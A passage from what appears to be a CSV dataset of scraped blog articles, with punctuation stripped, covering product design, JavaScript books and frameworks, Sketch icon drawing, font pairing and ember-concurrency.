different cities and D partements   A building name won t also be a number Ben Tilly reports on Ten Post Office Sq  Boston MA 02109 USA   which is not  reportedly  the same as 10 Post Office Sq  Boston MA 02109 USA   Well  at least you can omit leading zeros Shaun Crampton reports living at 101 Alma St  Apartment 001  Palo Alto   where apartments 1 and 001 were on different floors,"[1127 311 996 444 599 1132 726 849 629 400 28]"
1132,training-dataset/product/295.txt,product,7 Rules Driving the Psychology Behind Great Product Design2  Require as Few Interactions as Possible  Infer a lot  otherwise tasks become mundane  An easy way to lose flow is to be bored or apathetic  When a user has to do a lot of work to get a small result  the work at hand becomes mundane and redundant  They no longer face the challenge of their work  they re stuck doing data entry   Figure out as much as possible from as few interactions as possible   For example  in Mail Pilot  we had a feature where you could set a reminder for an email to come back in the future  On an ordinary interface  this could take 5 taps  open the message  hit a button to set a reminder  select the month  select the day  hit okay  With our mobile app  we needed to require fewer interactions  otherwise people wouldn t use it while trying to quickly triage their inbox   We managed to get it down to one interaction  You would simply slide a message further to the right to set a reminder in an increasing number of days  releasing on the number you wanted   See here   It became one of our user s most loved and most used features   Before  users would almost never set a reminder on the mobile   it was too cumbersome   so they would wait until they were on the desktop  What a pain  Once we shipped this  scrubbing  interface  setting a reminder was the second most used organization on the mobile  after completing a message    This is also the foundation of what makes Throttle so successful  The basic premise sounds cumbersome  every time you sign up for something new online  Throttle generates a unique  random email address for you to use  This way you can control who sends you email in an airtight way  find out who tries to sell or steal your address  and stop giving out your address online  But it sounds like an intensely cumbersome system to use  even if you do get the stuff out of your inbox that you want to receive but that doesn t belong there   Here s the kicker though   the genius of it is how you interact with the system  The Throttle browser extension puts a button in all email form fields  To generate an address  all you do is click the button  which is already right in place where you need it   it s even faster than what you used to do  type your real email address   To read messages you ve received  Throttle sends a single daily digest email to your inbox at the time you deem most productive  It effectively puts this intense system of hundreds of email addresses all managed for you  right at your fingertips in just two touch points  where you re already going to be anyway  the form online   your inbox   That s what makes it work so well  Users don t have to think about it  remember to check it it  or manage it   Consider This  How could your app do more for the user with less input  How could the key interactions with your app be closer to where the user already is when they need it,"[1132 1395 900 400 629 28 444 248 45 1001 887]"
1144,training-dataset/engineering/1100.txt,engineering,12 Books Every JavaScript Developer Should Read   JavaScript Scene   Medium12 Books Every JavaScript Developer Should Read  I m a big fan of JavaScript books  Being a long time learner of JavaScript  I ve had the pleasure of reading a great many of the popular JavaScript books on the market  These days I tend to skip the ones targeted to rank newbies  but I still read a lot of books intended for JavaScript developers with a little experience   This is a strange time for JavaScript books  Because we just got a major update to the JavaScript language in ES6  today s JavaScript syntax and style looks quite different from the ES3 ES5 style JavaScript you ll see discussed in most books  but because ES6 is really just a superset of ES5  most of the old books have nuggets of learning that still apply   In other words  the old books aren t obsolete  they re just showing their age a little   even the ones released only 2 years ago  It might seem like talking to a senior citizen who still uses slang from the 60 s  If you re new to JavaScript  it might be fun to discover all the crazy hacks old timers used to put up with just to use array methods on arguments  Enjoy the JS history lesson   Some authors in the JavaScript community have written books intended to teach you ES6  I recommend reading them after you have a little familiarity with basic JavaScript  If you don t know ES6 yet  read  How to Learn ES6    Eventually  all new JS book authors will take ES6 for granted  and then the JS book world will return to normal  I ll list my recommendations roughly in learning order   As with my other book posts  the Amazon links are affiliate links  and a portion of the money you spend will be used to fight homelessness with JSHomes   Enough talk  Bring out the books   The Books   JavaScript for Kids  A Playful Introduction to Programming  by Nick Morgan  True to the title  this book is a whimsical exploration of very basic programming concepts  but don t let that fool you  Books for kids aren t just for kids  If you have never touched code before  this is a good place to start  even if you re all grown up  Diving in the deep end before you learn how to swim can be a frustrating experience  It s better to start your practice with some easy wins   2   Eloquent JavaScript  A Modern Introduction to Programming  by Marijn Haverbeke  This book is a work of art  It walks you through the essential concepts with a clear roadmap using clear language  It s masterfully composed and edited  and unlike most programming books  it s full of exercises for you to practice  If I were teaching the basics of programming in high school or college  I would use this as a text book   3   JavaScript  The Good Parts  by Douglas Crockford  It may seem absurd now  but when this book was written  JavaScript was still a young language which started life as a tiny scripting language in browsers  At the time  browsers were just beginning to be explored by serious application developers   Prior to 2004  it was very rare to see real applications running in a browser  The browser was barely interactive  It required page reloads to transmit any data to the server  it didn t have any storage capacity of its own worth talking about  JavaScript was primarily used to create trivial user interface effects like mouse hover states   JavaScript was the target of many jokes from  real programmers  who wrote code in compiled languages like C C    C   and Java  If you wanted to do any real programming for the browser  you used flash   In those days  it was easy to ridicule JavaScript  and everybody seemed to do it  but Douglas Crockford recognized that Brendan Eich hid some nuggets in the language that are only now starting to be truly appreciated by the programming masses  This book explores the basics of those features  and may give you a new appreciation for how special and cool JavaScript really is   4   Programming JavaScript Applications  Robust Web Architecture with Node  HTML5  and Moderns JS Libraries  by Eric Elliott  that s me   When I started hiring JavaScript developers to build applications  it really struck me how few of them understood how to harness JavaScript to build robust application architecture  With that in mind  I decided to write a book that would cover some JavaScript best practices  introduce people to prototypes  object composition  and at least the basic concepts of functional programming  enough to understand how to build and maintain a typical JavaScript application   and then apply those concepts to building some of the common concerns that spring up in the majority of applications  regardless of the application business domain   Lots of books answer the question   how do I use JavaScript   I wanted to answer the question   how do I use JavaScript to build a real application    Technology changed a lot in the two years since we released the book  but in my honest opinion  as objective as the author can be   it s still the best overview of JavaScript app architecture on the market today  In addition to deepening your understanding of JavaScript  you ll learn about Node basics  RESTful APIs  authentication and authorization  feature toggle systems  logging  and more   5   Effective JavaScript  68 Specific Ways to Harness the Power of JavaScript  by David Herman  After you ve had some basic exposure to JavaScript   Effective JavaScript  will take you on a guided tour of the language in more depth  showing by example lessons taught by a master programmer seasoned in his craft   Right away you ll be introduced to some of the quirks of JavaScript  from floating point number precision  because JavaScript only has one number type  and it s a floating point type   to the oddities of type coercions and semicolon insertion  The rest of the book continues in the same style  exploring best practices for working with functions  objects  arrays  library and API design  and concurrency  Regardless of your skill level  I promise you will learn something new   6   JavaScript  The Definitive Guide  by David Flanagan  The Definitive Guide is a deep exploration of JavaScript and web platform API features from the perspective of somebody interested in building web applications  It is a fairly thorough overview of a lot of language features  sprinkled with warnings about old versions of IE that you can probably safely ignore at this point  There have been six editions of the book  and I hope there are many more editions to come  I have owned previous editions  and I always learn something new when a new one is released   7   You Don t Know JS  by Kyle Simpson  This one is really a series of books   all of them similar in style and scope  some of them bigger than others  and all of them very good   I have been programming in JavaScript for a long time  I have studied multiple versions of the JavaScript specifications  and followed the development of new versions of the specification closely  yet Kyle s deep fascination with exploring all the little nooks and crannies managed to uncover many bits of the language that I had not yet discovered or explored   If you thought  The Definitive Guide  was a deep dive  break out your scuba gear and prep your deep sea submersible ocean explorer  You re about to see some JavaScript species no human has ever encountered before  well  before this series was written  anyway    What you won t find in this series is a lot of talk about software architecture  deep programmer wisdom  or an abundance of software design principles that will easily span many different languages  But it will certainly help you gain a new appreciation and a deeper understanding of JavaScript  Kyle s singular focus on deep diving into language features is a rare treasure that I imagine even the TC39 team could learn something from   8   JavaScript Allong   The Six Edition  by Reginald Braithwaite  JavaScript Allong  in its essence is a book about thinking in functions  Building flexible software from small  decoupled units   That said  it tries not to be overly prescriptive or opinionated  To borrow from the introduction    JavaScript Allong  does not attempt to address the question of JavaScript best practices in the wider context of software development  because JavaScript Allong  isn t a book about practicing  it s a book about thinking    As you read the book  you ll realize that the author keeps his promises  This should definitely not be the first JavaScript book you read  Reginald introduces simple concepts like  const  by slow building through intermediate function scope topics like IIFE and closures  after demonstrating partial applications and curried function expressions   Most introductory JavaScript books wisely begin by talking about values and how to represent those values with bindings using  var    let   or  const   Reginald flips the beat for good reason   he ll have your brain dancing  The book is trying to help you think differently and deeply about functions  and it works   You should read it after you have a working familiarity with JavaScript  when you re ready to start exploring how to combine functional and object oriented programming techniques to build JavaScript applications   9   Professor Frisby s Mostly Adequate Guide to Functional Programming  by Brian Lonsdorf  This book is unfinished  Read it anyway   No  you re not stupid  It s hard to learn functional programming  I ve been slowly learning over the course of many years  and I feel like I ve barely scratched the surface  I ve accepted that this feeling never really goes away   Luckily  Professor Frisby is a wonderful guide   The world of functional programming is full of terms from lambda calculus  algebra  and category theory  In this jungle of academic lingo  it s very easy to get lost and feel stuck  Professor Frisby s tone is energetic and entertaining  Here s a sample from the related video series   If only all programming books were so much fun to read while they re beating new  challenging concepts into our thick skulls  This is a book you may want to read many times  and unlike many other challenging books on computer science topics  you ll actually enjoy doing it   10   Node js in Action  by by Mike Cantelon  Marc Harter  TJ Holowaychuk  and Nathan Rajlich   Node js in Action  is a great introduction to basic Node application development covering essential topics like HTTP HTTPS  Connect Express middleware  realtime messaging with Socket IO  using databases  and so on  If you re new to Node  this is a great place to start   11   High Performance Browser Networking  by Ilya Grigorik  It is difficult to overstate the importance of great application performance  Shaving milliseconds off of page load times and reducing UI jank deliver investment returns that can only be rivaled by a great user interface design overhaul   This book covers high impact performance considerations such as HTTP2  data streaming  WebSockets  WebRTC  DataChannel  and so on   In other words  this book is the definitive guide to building a more successful application by optimizing its performance profile   12   Web Audio API  by Boris Smus  Every true JavaScript Rock Star needs this book  After all  you re not a real JS rock star until you plug your guitar into your web browser  I know I said these were books  every JavaScript developer should read   but this one is only for JavaScript developers who love playing with sounds and music  Most JavaScript developers could get away with never learning this API  and it wouldn t hurt them at all   but that s boring   This book is on my list primarily because I love music and audio engineering  The web audio API is actually a system of related APIs for generating and manipulating sound using web platform standards  You can use it in browsers and in Node   To use the web audio API  you manipulate nodes in a graph  Normally  I d just refer you to a handy reference  but unless you re an audio engineer  you might feel a bit overwhelmed  This book guides you through the various types of audio nodes and teaches you how to weave them together  work with the timing API to precisely schedule sounds  manipulate parameters over time  apply audio effects  and even create audio visualizations   In other words  it s a whole lot of fun,"[1144 1305 329 1267 454 849 629 400 28 326 820]"
1163,training-dataset/product/923.txt,product,UX distillingDesigners are asked to perform minor miracles by transforming large amounts of information into simplified communicative designs   Oh  yeah and those designs have to be beautiful   That s why we hosted a DesignTalk with Daniel O Sullivan  creator of the concept of UX distilling  Like a master distiller transforms a large pot of mash into a fine bourbon  UX distilling is a methodology that facilitates the translation from data to design in 5 simple steps   Watch Daniel s full talk below  or read on for our short recap   The problem  Daniel used a case study from a construction management application called Field Vine  They were in need of a dashboard design to host a lot of information and functionality  The problem was to make it as simple but robust as possible   Step 1  Identify components  Figure out the high level components of your design  Daniel realized that for this product to work  it needed 3 different components   Navigations to get to deeper areas of information and functionality Features to actually perform tasks in the application Metrics so users could see the state of their business at a glance  Step 2  Gathering requirements  Think of every possible requirement  Daniel brainstormed everything the dashboard could need and wrote each one on a sticky note   For the navigation and features  he included things like ways to communicate with contractors  view permits you pulled  inspect a customer profile  see jobs to be done  schedule contractors  and general house keeping   For metrics  he knew that he wanted to include things that were helpful and positive  inline with the ideals of positive UX   Step 3  Outline the design  The third step is to combine the requirements and start to distill   Now that Daniel had all of his requirements on sticky notes  he was able to manually move them around in the design to see what worked best and what could overlap  Then  he simply drew boxes around them to create initial wireframes   Daniel shared a few best practices   Know your tools  You don t have to be a unicorn and know how to code  but you should know how code works   You don t have to be a unicorn and know how to code  but Use proper color theory to help the user to understand what they re doing  Be careful about using red in positive situations   to help the user to understand what they re doing  Be careful about using red in positive situations  Use proper iconography to limit confusion  If you re on the fence about whether to use a particular icon  do the Grandmother Test  Test it out with someone in an older generation from you to see if the icon is as universal as you believe   To learn more about step 4  mockup  and step 5  refine   watch the video above  Or check out all of our other DesignTalks below,"[1163 400 629 28 444 1420 1001 218 319 425 1305]"
1175,training-dataset/product/1390.txt,product,The Sketch Handbook  Designing icons in SketchThis is an excerpt from The Sketch Handbook from Smashing Magazine   everything you ever wanted to know about designing with Sketch on 376 pages   Hint  I m the author  What s below is an advanced tutorial from later on in the book  but if you re a Sketch beginner  don t worry  The book starts with the basics and guides you through every feature of Sketch   In this tutorial  we re going to use Sketch to design the first of 4 icons  Here are all of the icons   First  add a new page to house all 4 icons  Name it  Icons   Each of the icons should be 64   64 pixels and on its own artboard  Add the first one and change both the X and Y position to 0 for a clearly defined starting point   Since we re starting with the  Seaside  icon  be sure to use this name for the artboard  Change the background color to the blue   55BFE1  from the category icon of the responsive article  but switch off Include in Export  It s good that we saved it to the Document Colors earlier   The first element for each icon is a white circle  the size of the artboard  which will also define its boundaries and act as a mask  Fig 10 2  left   Draw one after you have pressed O  and hold Shift to lock the ratio  The circle should start in the top left corner  Name it  Mask   Although the icons have an 8px border in the article  let s leave it out for the moment  We can add it later   Related  Learn how to switch to Sketch in this free and easy video course from InVision  Because we want to create a pixel perfect icon  let s set up a 2   2 grid now  Click on View   Grid Settings  in the toolbar and enter a Grid block size of 2px  Fig  10 2  right   Thick lines aren t necessary  insert 0 here   This grid not only allows us to place all of the elements of the icon on full pixels  but helps us avoid blurry lines if we stick to icon sizes that are multiples or halves of 64 pixels  To employ this grid to the fullest degree  always make sure that shapes align exactly to the grid lines when you add or modify them  It s good to assess the quality of the icon occasionally without the grid lines  You can press Cmd   G to turn them off   A better view  To get a better view for what we ll be doing  zoom in to 800   While it s much easier to work on the details of the icon in this zoomed state  there s also the danger of losing a view of the overall quality  Luckily  Sketch Mirror helps here  especially if you have a second computer screen  You can work on the first display in this zoomed in state in Sketch  while the second display shows the original size   Click on Mirror in the toolbar and the URL at the bottom right of the dialog to open the design in the browser  There  select the  Icons  page at the top  and pick the icon or search for its name with the search function in the top right corner to open it in a single view  Whenever you change something in Sketch now  it will immediately be reflected here  You can even set the currently selected artboard to automatically show in Mirror  Just enable Show current Artboard in the General tab of Preferences   The tree  For inspiration  I gave the icon search on The Noun Project a shot and browsed for some terms that I associate with the  seaside  theme  I landed on a boat floating on some waves and a tree representing the nature around the lake  This is the element we ll begin with  It consists of 3 basic triangles for the branches and a rectangle for the trunk  Fig  10 3   While Sketch offers a distinct triangle shape for the former  I prefer to use a rectangle instead  because I m more free to pick the alignment  Plus  it s accessible with a keyboard shortcut   For the treetop  press R and add a first rectangle with a size of 12   6  aligned to the grid  Make sure that this applies to all shapes that you add from now on  Go into the vector point mode with Enter  hold Cmd and click on the upper line to add a point in the exact middle  After that  select the points to the left and right with a Shift click  You can also drag a selection to each point  instead of Shift clicking  if it s hard to catch   Now  delete these points with Delete or Backspace  which will give us the desired triangle  and exit vector point mode with Esc  After that  duplicate the shape  either with Cmd   D or by holding Alt and dragging it down  In case you prefer the first method  make sure that Offset duplicated layers is switched off in the Layers tab of the Preferences  so that the duplicate stays at the same position as the original  After that  move the triangle down by 4 pixels  Either use the down arrow key or add   4  to the Y field in the inspector  If the latter  press Esc to leave the input field   This second triangle should be wider by 4 pixels and higher by 2 pixels  The fastest way to resize it is to hold Cmd and press the right arrow key until you ve added 4 pixels  Keep holding Cmd and use the down arrow key in the same manner to make it 2 pixels higher  All of that can be done in the inspector  too   Also create a duplicate of this second triangle  and modify it in the same manner  4px wider  2px higher  moved down by 4px  Repeat the exact same steps for the 4th triangle  The last part of the tree  the trunk at the bottom  is a simple square  4   4  After you ve added all of the required shapes for the tree  select them and center them relative to each other with a right click and then Align Center   With all the parts still selected  make a Boolean operation of the type Union by pressing Alt   Cmd   U  This will add all of the shapes to a single layer and lets you change the color at once to the same as the artboard s background  Lastly  rename it to  Tree   and move it to an X position of 4 and a Y position of 10 to leave room for the other parts   The boat  All right  let s float over to the boat  It might not be obvious at first  but it also consists of 3 modified rectangles  Fig  10 4    First  create a rectangle with the dimensions of 14   20 in the free space on the right side of the icon  for the larger sail  Enter vector point mode like before  which will select the top left point  the starting point of the shape  However  the literal point of interest at the moment is the one in the top right  Press Tab to jump to it  followed by Delete to remove it  Leave the vector point mode  Piece of cake   Believe it or not  the second smaller sail is even easier  Duplicate the big sail  right click  and select Transform   Flip Horizontal  Jump to the inspector with Alt   Tab  move to the Width field with subsequent Tab presses  enter 8  continue to the Height  and enter 12  Press Esc to exit the field  Now  hit the left arrow key until the smart guides show that there is a gap of 2 pixels from the other sail  Also  move the smaller sail down with the down arrow key until both sails are on the same baseline  In the end  select both shapes to create another Union Boolean operation   For the boat hull  add yet another rectangle of 38   12 pixels below the sails and a spacing of 2 pixels  After entering vector point mode  hold Cmd and click on the lower line to add a point in the middle  Press Tab to jump to the lower left point  hit Delete to delete it  press Tab again  but this time in combination with Shift to go in the reverse direction until you reach the bottom right point  Also delete it   A triangular boat looks quite dull  so let s fix that with a double click on the lower point  which will change the type from a Straight to a Mirrored point  This action gives us not only a round shape but also 2 vector control points that define the curve  Drag either of them out to increase the roundness of it  Looks good   Leave vector point mode and select the boat hull together with the group of sails  Center them horizontally  but then move the sails one pixel to the right so that they are aligned to the grid again  Finally  select them all together and add them to the same group with another Union operation  Change the color to match the other parts of the icon  Rename this group to  Boat   and change the position to 22  X  and 18  Y   Now let s hide it with Shift   Cmd   H  so that we have an unobstructed view for the last part of the icon   The waves  A boat can t float in the air we need some water to carry it  The waves increase the difficulty level slightly  but with a few cleverly placed shapes  they re easy to do  The waves are formed by a row of ovals with a border  which forms the actual wave line   The starting point is a single oval  Draw one with dimensions of 16   12  Add it at the left edge of the icon  below the tree  so that you have room for the subsequent copies  Hold Alt and drag a copy to the right until both of the elements touch and are on the same line  Now  press Cmd   D to add elements with the same spacing until you have a total of 4 ovals  Still doesn t look like waves  A step in the right direction is to select all of these shapes so that you are able to form a Union Boolean operation  Make sure that this group is centered to the artboard horizontally   One element is still missing  a rectangle of 64   28 pixels  where we can carve the ovals out to form the final waves  Move it vertically until its upper side is centered to the ovals  also  center it horizontally to the artboard  Fig  10 5  1   Now  drag the rectangle into the Boolean group in the layers list  but ensure that it is in the bottommost position  Finally  select all of the ovals again and change their Boolean type with a click on Subtract  the small icon next to the layers in the layers list  Fig  10 5  2   Now we re getting serious   Complete the waves by adding an Inside border with a Thickness of 2px to the combined shape  and assign it the same color as everything else  Just like with the fill color  you can use the color picker with Ctrl   C to do this  but you ll need to remove the fill with F first  we won t need it anyway   Finally  name this Boolean group  Waves top   and move it to a Y position of  42    To create some movement  add a second line of waves  offset to the right by 8px  half the width of an oval  The final Y position for this second line of waves is 52  and the name should be  Waves bottom   Fig  10 6   If you select the  Boat  group in the layers list now and unhide it  it will float nicely on the upper water line   To finish it up  combine everything into an  Icon  group so that it s easier to grab the whole package at once  Also  change the white circle in the back to a mask with Ctrl   Cmd   M  so that everything outside of this shape is clipped  it needs to be in the bottommost position for this to work  For the finished icon  have a look at Fig  10 1   This was an excerpt from The Sketch Handbook  which teaches you everything you need to know about Sketch on 376 pages   You ll love these posts about Sketch,"[1175 887 1344 1077 564 69 1001 444 425 270 599]"
1267,training-dataset/engineering/375.txt,engineering,ember concurrency  or  How I Learned to Stop Worrying and Love the TaskFig  5  By storing previously successful tasks  we can show data updates  Here  we leave a route and re enter it to trigger a data update   Benefits for both parties in a web app  A large web app is successful if users enjoy navigating it and if developers enjoy building it  While ember concurrency was written with the intention of reducing boilerplate code and enforcing logical boundaries  our full scale adoption of the add on has made the user experience much smoother  We have built an app that demonstrates the benefits of single page applications  route transitions feel extremely speedy because the model hook returns simple objects without pausing to resolve promises  and the user receives instant visual feedback about network operations in response to clicks  Pages that retrieve data from multiple sources can display it in a progressive way and minimize idle time where the user cannot interact with the page  Responsive filter based interfaces reflect data updates in a clear and dynamic way   Many JavaScript developers  myself included  can relate to the frustration of staring at a promise chain or callback functions to understand a particular execution flow  JavaScript s powerful concurrency model and event loop become very cumbersome to manage in complex apps  where multiple components and routes multiply the unpredictability of user interaction and network latency   ember concurrency s mission to improve developer experience has been a great success  When futuristic ES6 features like generator functions were introduced  many developers nodded their head and shrugged  it seemed like a different way to execute the same asynchronous operations  with no obvious breakthrough implementation  A few years later  ember concurrency has established itself as one of the most dynamic applications of generator functions  We now write readable code without convoluted promise callbacks  The browser uses an event loop to handle asynchrony  but our brains have an easier time understanding logic that looks synchronous  Like other modern JavaScript features such as async await  generator functions abstract the complexity of the run loop into structured  linear code that mimics a flat timeline  Developers like us are the big winners  as our code is more readable and maintainable   A glimpse into the future of JavaScript  Tasks reflect a shift from the philosophy of promise based frameworks  whereas promises ensure that specific code will be run  the unpredictability of the web is such that making future guarantees behind time based operations is dangerous  Tasks that are bound to components offer a much more reassuring guarantee  assuring us that code will be executed as long as the component is active and the task is not explicitly canceled  We are much more comfortable and engaged writing code because we know that an add on is abstracting out the boilerplate logic   ember concurrency is still not perfect  and our work in internal tools has shielded us from the few downsides of using it  By assuming that our users use modern browsers on a fast connection  we could afford to take a flyer on a library that initially required heavy Babel polyfills  though this is no longer the case  and did not provide easy server side rendering support with Ember FastBoot  Several months later  the add on feels more mature  and we have been so happy with it that we have entirely eradicated promises from our code base  By going at the heart of issues like developer convenience and concurrency management  it is one of the best concrete applications of futuristic JavaScript features  Give it a shot  we guarantee it ll change the way you write Ember   Acknowledgements  Warm thanks to Alex Matchneer for building this truly game changing add on and helping me understand the motivations behind it  to Josh Lawrence for his willingness to take calculated risks in our big project  and to the rest of the Centralized Release Tool team for their tremendous work on highlighting the power of ember concurrency,"[329 1267 454 629 400 28 1305 1144 820 248 223]"
1275,training-dataset/product/1371.txt,product,How to pair fontsThis is an excerpt from Designing with type  a free  9 part InVision e course by Luke Jones   We ve already gone over how to describe typefaces and how to choose a font  so now it s time to learn about mixing fonts  Combining different typefaces is an indispensable part of providing readers with an elegant  pleasurable read   Mixing fonts isn t a matter of picking 2 contrasting typefaces at random and putting them on a page it requires careful effort so the fonts complement one another in their different shapes  sizes  and textures  and bring a visual harmony to the page   Why mix fonts   Mixing fonts is usually useful for 2 main reasons   Provides typographic contrast without adding design noise to a page  Provides an additional font when body text may not be suitable by itself for many different kinds of content  Related  Use these typography tips for a more comfortable read  To provide typographic contrast  An additional font can bring emphasis to different kinds of content  headings and block quotes  for example   Bringing contrast to these can make the page feel more elegant  or it can make the content easier to read   A great example  using serif text for a block quote  The serif text complements the surrounding text and provides a gravitas that the standard font would not   Because the body font is unsuitable  In cases where a superfamily isn t suitable and the body text font doesn t work at larger sizes  use a different font for larger text such as headings  Using a similar font to the body text is a dangerous game each font will be subtly different  and while people may not be able to articulate why something looks wrong  they ll feel it  So it s best to provide some contrast between these 2 different kinds of fonts   Experimentation  Mixing fonts is about experimentation and playing with ideas  but understand how the font is going to be used  Is it a heading font  Then create a layout where the text will need to be tested as a heading  Is it a blockquote font  Do the same   Once the role of the new font is clear  start searching and mixing fonts  Use the same methods mentioned in the previous chapter to find the required font  and compare it alongside your font to see if it works   Need some filler text for font testing  Grab Craft by InVision and ditch lorem ipsum forever   Tips for finding the right font  A simple tip for deciding whether 2 fonts will compare well  Look at the x height of the font and try and match that to the body text  The x height is a major factor in defining how text feels when read  so if 2 fonts have a similar x height  they ll be easier to combine and will flow into one another more naturally   Inspiration for mixing fonts  Need some recommendations and inspiration  Check out these sites   TypeGenius  http   www typegenius com   Just My Type  http   justmytype co   Font Pair  http   fontpair co   2 fonts might not be enough   In traditional print design  it s common to mix more than 2 fonts to bring contrast  texture  and hierarchy to a page  Newspapers are filled with words and these words are designed to help communicate the design   So if a design is complex and requires more weights of a font  then it s okay to introduce them   This isn t to say it s okay to add a bunch of fonts to a design this has further ramifications like page weight and additional complexity in typesetting  Use only what s necessary and nothing more   Don t settle on the first fonts you find  It s possible to strike gold on your first attempt  but it s never a good idea to stop the moment you find a font that seems right  Continue to experiment with different fonts  Think of the different variations of where this font will appear and what screens it ll be on   Think of mixing fonts as any other part of an iterative design challenge  With each choice there s an opportunity to improve   Managing the roles of each font  Now that you ve chosen fonts and they re working well  start figuring out each font s roles in the design  Something as simple as a text document outlining what each font will be used for will help bring consistency to a project plus  it ll be a good reference throughout   A document like this is the beginning of a style guide  and starting early is an incredibly efficient way of moving through a design   Here s an example of what the document could look like   Primary heading    Font Name y    Secondary heading    Font Name y   Tertiary heading    Font Name x    Intro text    font name x    Body text    font name x    Pull quotes    font name z    Caption text    font name x    Most applications have useful paragraph or character style palettes that can be used to manage these styles as an easy reference  too  On a daily basis  I use Sketch  Photoshop  Keynote  or Pages each of these applications has a sidebar where I can click a button to add  modify  or remove a text style  At the click of a button there s a reference to my font styles and a way to update every text style in a document   Keep reading this e course  Get Luke Jones s free  9 part InVision e course  Designing with type  delivered right to your inbox   More on typography,"[1275 1334 311 218 564 1420 1001 425 1344 887 400]"
1305,training-dataset/engineering/547.txt,engineering,Top JavaScript Frameworks   Topics to Learn in 2017Top JavaScript Frameworks   Topics to Learn in 2017  The popularity of JavaScript has led to a very vibrant ecosystem of technologies  frameworks  and libraries  Along with all the amazing diversity and energy in the ecosystem comes a high degree of confusion for many  What technologies should you care about   Where should you invest your time to get the most benefit  Which tech stacks are companies hiring for right now  Which ones have the most growth potential   What are the most important technologies to know right now  This post is a high level overview of stuff you need to know  packed with links where you can learn all about it   Remember as you re learning to experiment with some actual code  You can play with code interactively on Codepen io  If you re still learning ES6  you can see how it translates using the Babel REPL   This is going to be a long list  but don t get discouraged  You can do this  If you re looking at this list  worried about how you ll ever learn everything you need to know to build modern apps  read  Why I m Thankful for JavaScript Fatigue   Then buckle down and get to work   A Note on Optional Learning  Some of this stuff is strictly optional   which means  I recommend them if you are interested in them  or you need to know them for a job  but you should not feel obligated to learn them  Anything marked with an asterisk  e g   example   is optional   Anything not marked with a   should be learned  but don t feel obligated to learn everything there is to know about everything  You need to be aware of the non optional stuff  but you don t necessarily need to be a definitive subject matter expert on absolutely everything   JavaScript   DOM Fundamentals  Before you try to land a job using JavaScript  you should have a good grasp of JavaScript fundamentals   ES6   The current version of JavaScript is ES2016  aka ES7   but a lot of developers still haven t properly learned ES6  It s time to learn at least the essentials  Arrow functions  rest spread  default parameters  concise object literals  destructuring  etc   The current version of JavaScript is ES2016  aka ES7   but a lot of developers still haven t properly learned ES6  It s time to learn at least the essentials  Arrow functions  rest spread  default parameters  concise object literals  destructuring  etc  Closures   Learn how JavaScript s function scopes behave   Learn how JavaScript s function scopes behave  Functions   pure functions   You probably think you ve got a great grasp of functions  but JavaScript has some tricks up its sleeves  and you ll need to learn about pure functions to get a handle on functional programming   You probably think you ve got a great grasp of functions  but JavaScript has some tricks up its sleeves  and you ll need to learn about pure functions to get a handle on functional programming  Functional programming basics   Functional programming produces programs by composing mathematical functions  avoiding shared state   mutable data  It s been years since I ve seen a production JavaScript app that didn t make heavy use of functional programming  It s time to master the fundamentals   Functional programming produces programs by composing mathematical functions  avoiding shared state   mutable data  It s been years since I ve seen a production JavaScript app that didn t make heavy use of functional programming  It s time to master the fundamentals  Partial application   Curry  Builtin methods  Learn methods for the standard data types  especially arrays  objects  strings  and numbers    Learn methods for the standard data types  especially arrays  objects  strings  and numbers   Callbacks  A callback is a function used by another function to signal when there is a result ready  You say   do your job  call me when it s done    A callback is a function used by another function to signal when there is a result ready  You say   do your job  call me when it s done   Promises  A promise is a way to deal with future values  When a function returns a promise  you can attach callbacks using the  then   method to run after the promise resolves  The resolved value is passed into your callback function  e g   doSomething   then value    console log value     Tooling  Chrome Dev Tools   DOM inspect   JS debugger  The best debugger  IMO  though Firefox has some really cool tools you might want to check out  too   DOM inspect   JS debugger  The best debugger  IMO  though Firefox has some really cool tools you might want to check out  too  npm   The standard open source package repository for the JavaScript language   The standard open source package repository for the JavaScript language  git   GitHub   Distributed version manager   keeps track of your source code changes over time   Distributed version manager   keeps track of your source code changes over time  Babel   Used to compile ES6 to work on older browsers   Used to compile ES6 to work on older browsers  Webpack   The most popular bundler for standard JavaScript look for simple starter kit boilerplate config examples to get things running fast   The most popular bundler for standard JavaScript look for simple starter kit boilerplate config examples to get things running fast  Atom   VSCode   or WebStorm   vim   You re gonna need an editor  Atom and VSCode are the most popular JS editors today  Webstorm is another solution with very robust support for quality tooling  I recommend learning vim  or at least bookmarking the cheat sheet because sooner or later  you re gonna need to edit a file on a server  and it s the easiest way   vim comes installed on just about every flavor of Unix compatible OS  and works great over SSH terminal connections   You re gonna need an editor  Atom and VSCode are the most popular JS editors today  Webstorm is another solution with very robust support for quality tooling  I recommend learning vim  or at least bookmarking the cheat sheet because sooner or later  you re gonna need to edit a file on a server  and it s the easiest way   vim comes installed on just about every flavor of Unix compatible OS  and works great over SSH terminal connections  ESLint  Catch syntax errors and style issues early  After code review and TDD  the third best thing you can do to reduce bugs in your code   Catch syntax errors and style issues early  After code review and TDD  the third best thing you can do to reduce bugs in your code  Tern js  Type inference tools for standard JavaScript  and currently my favorite type related tool for JavaScript   no compile step or annotations required  I ve kicked all the tires  and Tern js delivers most of the benefits  and virtually none of the costs of using a static type system for JS   Type inference tools for standard JavaScript  and currently my favorite type related tool for JavaScript   no compile step or annotations required  I ve kicked all the tires  and Tern js delivers most of the benefits  and virtually none of the costs of using a static type system for JS  Yarn    Similar to npm  but install behavior is deterministic  and Yarn aims to be faster than npm   Similar to npm  but install behavior is deterministic  and Yarn aims to be faster than npm  TypeScript   Static types for JavaScript  Completely optional unless you re learning Angular 2   If you re not using Angular 2   you should evaluate carefully before choosing TypeScript  I like it a lot and I admire the TypeScript team s excellent work  but there are tradeoffs you need to know about  Required reading   The Shocking Secret About Static Types     You Might Not Need TypeScript    Static types for JavaScript  Completely optional unless you re learning Angular 2   If you re not using Angular 2   you should evaluate carefully before choosing TypeScript  I like it a lot and I admire the TypeScript team s excellent work  but there are tradeoffs you need to know about   The Shocking Secret About Static Types     You Might Not Need TypeScript   Flow   Static type checker for JavaScript  See  TypeScript vs Flow  for an impressively informed and objective comparison of the two  Note that I ve had some difficulty getting Flow to give me good IDE feedback  even using Nuclide   React  React is a JavaScript library for building user interfaces  created by Facebook  It s based on the idea of uni directional data flow  meaning that for each update cycle   React takes inputs to components as props and conditionally renders DOM updates if data has changed for specific parts of the DOM  Data updates during this phase can t retrigger the render until the next drawing phase  Event handling phase   after the DOM has rendered  React automatically delegates DOM events to a single event listener at the root of its DOM tree  for better performance   You can listen for events and update data in response  Using any changes to the data  the process repeats at 1   This is in contrast to 2 way data binding  